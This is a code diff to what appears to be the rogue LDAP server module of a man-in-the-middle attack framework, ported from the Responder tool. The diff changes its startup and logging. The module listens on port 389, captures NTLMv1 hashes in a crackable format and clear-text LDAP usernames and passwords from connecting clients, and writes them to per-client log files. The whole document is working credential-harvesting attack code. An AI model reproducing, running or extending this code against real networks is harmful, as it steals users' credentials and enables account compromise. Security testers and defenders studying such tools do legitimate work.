@@ -1,25 +1,27 @@
-##################################################################################
-#LDAP Stuff starts here
-##################################################################################
+import struct
+import logging
+import threading
+import re
+
+from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
+from LDAPPackets import *
+from core.responder.common import *
+
+mitmf_logger = logging.getLogger("mitmf")
 
 class LDAPServer():
 
-	def serve_thread_tcp(self, host, port, handler):
-		try:
-			server = ThreadingTCPServer((host, port), handler)
-			server.serve_forever()
-		except Exception, e:
-			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))
+	def start(self, chal):
+		global Challenge; Challenge = chal
 
-	#Function name self-explanatory
-	def start(self, LDAP_On_Off):
-		if LDAP_On_Off == "ON":
-			t = threading.Thread(name="LDAP", target=self.serve_thread_tcp, args=("0.0.0.0", 389,LDAP))
+		try:
+			mitmf_logger.debug("[LDAPServer] online")
+			server = ThreadingTCPServer(("0.0.0.0", 389), LDAP)
+			t = threading.Thread(name="LDAPServer", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
-		
-		if LDAP_On_Off == "OFF":
-			return False
+		except Exception, e:
+			mitmf_logger.error("[LDAPServer] Error starting on port {}: {}".format(389, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -54,15 +56,15 @@ def ParseLDAPHash(data,client):
 		UserLen = struct.unpack('<H',data[80:82])[0]
 		UserOffset = struct.unpack('<H',data[82:84])[0]
 		User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
-		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
+		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+Challenge
 		Outfile = "./logs/responder/LDAP-NTLMv1-"+client+".txt"
 		WriteData(Outfile,writehash,User+"::"+Domain)
 		#print "[LDAP] NTLMv1 complete hash is :", writehash
-		responder_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
+		mitmf_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
 	if LMhashLen <2 :
-		Message = '[+]LDAP Anonymous NTLM authentication, ignoring..'
+		Message = '[LDAPServer] LDAP Anonymous NTLM authentication, ignoring..'
 		#print Message
-		responder_logger.info(Message)
+		mitmf_logger.info(Message)
 
 def ParseNTLM(data,client):
 	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
@@ -91,8 +93,8 @@ def ParseLDAPPacket(data,client):
 				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
 				#print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
 				outfile = "./logs/responder/LDAP-Clear-Text-Password-"+client+".txt"
-				WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
-				responder_logger.info('[LDAP]User: %s Password: %s'%(UserDomain,Password))
+				WriteData(outfile,'[LDAPServer] User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
+				mitmf_logger.info('[LDAPServer] User: %s Password: %s'%(UserDomain,Password))
 			if sasl == "\xA3":
 				buff = ParseNTLM(data,client)
 				return buff
@@ -100,7 +102,7 @@ def ParseLDAPPacket(data,client):
 			buff = ParseSearch(data)
 			return buff
 		else:
-			responder_logger.info('[LDAP]Operation not supported')
+			mitmf_logger.info('[LDAPServer] Operation not supported')
 
 #LDAP Server Class
 class LDAP(BaseRequestHandler):
@@ -115,7 +117,3 @@ class LDAP(BaseRequestHandler):
 					self.request.send(buffer0)
 		except Exception:
 			pass #No need to print timeout errors.
-
-##################################################################################
-#LDAP Stuff ends here
-##################################################################################
